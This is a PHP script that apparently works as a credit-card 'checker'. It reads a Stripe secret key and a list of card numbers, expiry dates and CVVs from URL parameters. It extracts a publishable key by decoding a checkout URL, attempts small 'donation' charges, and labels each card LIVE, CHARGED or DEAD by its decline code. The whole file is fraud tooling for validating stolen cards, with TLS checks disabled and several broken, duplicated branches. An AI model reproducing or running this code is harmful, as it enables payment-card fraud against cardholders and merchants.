<?php

function GetStr($string, $start, $end){
$string = ' ' . $string;
$ini = strpos($string, $start);
if ($ini == 0) return '';
$ini += strlen($start);
$len = strpos($string, $end, $ini) - $ini;
return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string){
$one = str_replace($seperator, $seperator[0], $string);
$two = explode($seperator[0], $one);
return $two;
};

$sk = $_GET['sk'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/checkout/sessions');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

$url = $data['data'][0]['url'];
$obfuscatedPK = urldecode(explode("#", $url)[1]);

$decoded = base64_decode($obfuscatedPK);
$deobfed = "";
foreach(str_split($decoded) as $c) {
$deobfed .= chr(5 ^ ord($c));
}

$shuroap = json_decode($deobfed, true);
$pklive = $shuroap["apiKey"];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$result = curl_exec($ch);
curl_close($ch);

$json = json_decode($result, true);

$currency = $json['currency'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods'); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_USERNAME, $sk. ':' . ''); 
curl_setopt($ch, CURLOPT_USERPWD, $pklive. ':' . ''); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.''); 
$result1 = curl_exec($ch); 
curl_close($ch);
$tok1 = Getstr($result1,'"id": "','"');
$msg = Getstr($result1,'"message": "','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency='.$currency.'&payment_method_types[]=card&description=@StarBoiXD+Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
$result2 = curl_exec($ch);


if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo '#CHARGED CC - '.$lista.'<br>RESULT - $'.$amt.' CHARGED ✅ <br>';
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '#LIVE CC - '.$lista.'<br>RESULT - CVV LIVE<br>';
}
elseif(strpos($result1, "generic_decline")) {
	echo '#DEAD CC - '.$lista.'<br>RESULT - GENERIC DECLINED<br>';
}
elseif(strpos($result2, "generic_decline" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - GENERIC DECLINED<br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo '#LIVE CC - '.$lista.'<br>RESULT - INSUFFICIENT FUNDS<br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - FRAUDULENT<br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - DO NOT HONOR<br>';
}
elseif(strpos($resul2, "do_not_honor" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - DO NOT HONOR<br>';
}
elseif(strpos($result,"fraudulent")){
    echo '#DEAD CC - '.$lista.'<br>RESULT - FRAUDULENT<br>';
}
elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '#LIVE CC - '.$lista.'<br>RESULT - CCN<br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '#LIVE CC - '.$lista.'<br>RESULT - CCN<br>';
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo '#DEAD CC - '.$lista.'<br>RESULT - INVAILD EXPIRY MONTH<br>';
}
elseif(strpos($result2,"invalid_account")){
    echo '#DEAD CC - '.$lista.'<br>RESULT - INVAILD ACCOUNT<br>';
}
elseif(strpos($result2, "do_not_honor")) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - DO NOT HONOR<br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - LOST CARD<br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - LOST CARD<br>RESULT - CHECKER BY GUNNU <br>';
}
elseif(strpos($result2, "stolen_card" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - STOLEN CARD<br>';
}
elseif(strpos($result2, "stolen_card" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - STOLEN CARD<br>';
}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '#LIVE CC - '.$lista.'<br>RESULT - TRANSACTION NOT ALLOWED<br>';
}
elseif(strpos($result2, "authentication_required")) {
	echo '#LIVE CC - '.$lista.'<br>RESULT - 32DS REQUIRED<br>';
} 
elseif(strpos($result2, "card_error_authentication_required")) {
	echo '#LIVE CC - '.$lista.'<br>RESULT - 32DS REQUIRED<br>';
} 
elseif(strpos($result2, "card_error_authentication_required")) {
	echo '#LIVE CC - '.$lista.'<br>RESULT - 32DS REQUIRED<br>';
} 
elseif(strpos($result1, "card_error_authentication_required")) {
	echo '#LIVE CC - '.$lista.'<br>RESULT - 32DS REQUIRED<br>';
} 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '#LIVE CC - '.$lista.'<br>RESULT - Security code is incorrect<br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - PICKUP CARD<br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - PICKUP CARD<br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - EXPIRED CARD<br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - EXPIRED CARD<br>';
}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo '#DEAD CC - '.$lista.'<br>RESULT - RATE LIMIT<br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - PROCESSING ERROR<br>';
}
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - YOUR CARD NUMBER IS INCORRECT<br>';
}
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - SERVICE NOT ALLOWED<br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - PROCESSING ERROR<br>';
}
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - YOUR CARD NUMBER IS INCORRECT<br>';
}
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - SERVICE NOT ALLOWED<br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - INCORRECT CARD NUMBER<br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - INCORRECT CARD NUMBER<br>';
}
elseif(strpos($result1, "do_not_honor")) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - DO NOT HONOR<br>';
}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - CARD WAS DECLINED<br>';
}
elseif(strpos($result1, "do_not_honor")) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - DO NOT HONOR<br>';
}
elseif(strpos($result2, "generic_decline")) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - GENERIC CARD<br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - CARD DECLINED<br>';
}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo '#DEAD CC - '.$lista.'<br>RESULT - DO NOT HONOR<br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '#DEAD CC - '.$lista.'<br>RESULT - CVC_UNCHECKED : INFORM AT OWNER<br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '#DEAD CC - '.$lista.'<br>RESULT - CVC_CHECK : FAIL<br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo '#DEAD CC - '.$lista.'<br>RESULT - CARD NOT SUPPORTED<br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '#DEAD CC - '.$lista.'<br>RESULT - CVC_CHECK : UNVAILABLE<br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '#DEAD CC - '.$lista.'<br>RESULT - CVC_UNCHECKED : INFORM TO OWNER<br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '#DEAD CC - '.$lista.'<br>RESULT - CVC_CHECKED : FAIL<br>';
}
elseif(strpos($result2,"currency_not_supported")) {
	echo '#DEAD CC - '.$lista.'<br>RESULT - CURRENCY NOT SUPORTED TRY IN INR<br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - CARD NOT SUPPORT THIS TYPE OF PURCHASE<br>';
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '#LIVE CC - '.$lista.'<br>RESULT - CVV LIVE<br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - FRAUDULENT<br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - TESTMODE<br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - REVOKED<br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - INVALID PARAMETER<br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '#DEAD CC - '.$lista.'<br>RESULT - CARD NOT SUPPORTED<br>';
}
else {
    echo '#DEAD CC - '.$lista.'<br>RESULT - INCREASE AMOUNT OR TRY ANOTHER CARD<br>';
}

?>
